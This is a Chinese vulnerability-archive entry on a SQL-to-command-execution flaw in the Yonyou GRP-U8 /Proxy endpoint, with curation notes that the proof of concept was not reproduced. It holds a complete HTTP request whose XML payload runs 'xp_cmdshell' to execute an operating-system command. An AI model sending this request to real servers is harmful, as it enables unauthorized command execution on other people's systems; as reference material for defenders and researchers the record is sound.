---
source: "白阁文库 BaizeSec/bylibrary"
title: "用友GRP-U8 Proxy SQL执行到命令"
product: "用友GRP-U8"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知"
prerequisites: "DB xp_cmdshell启用且权限足够"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BGRP-u8/%E7%94%A8%E5%8F%8B%20GRP-u8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-4161b1d13326fd2783779af0"
entity_id: "ve-4161b1d13326fd2783779af0"
schema_version: "1"
---

# 用友GRP-U8 Proxy SQL执行到命令

## 条目说明

- 对象与具体问题：用友GRP-U8；Proxy SQL执行到命令
- 版本、配置及部署条件：未知
- 认证与权限前提：DB xp_cmdshell启用且权限足够
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有命令型请求无基线/响应/根因，不能无条件RCE
- 同Proxy族无独立信息除原发布日期

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

---
title: '用友 GRP-u8注入漏洞'
date: Fri, 11 Sep 2020 15:08:00 +0000
draft: false
tags: ['白阁-漏洞库']
---

#### 漏洞范围

GRP-u8

#### 漏洞POC

```http
POST /Proxy HTTP/1.1
Accept: Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)
Host: host
Connection: Keep-Alive
Cache-Control: no-cache


cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell 'ipconfig'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> 
```

> 请求长度说明：原资料 Content-Length 为 357；静态长度已移除，应由客户端根据最终请求体的字节数生成。


---

> 来源：白阁文库 BaizeSec/bylibrary
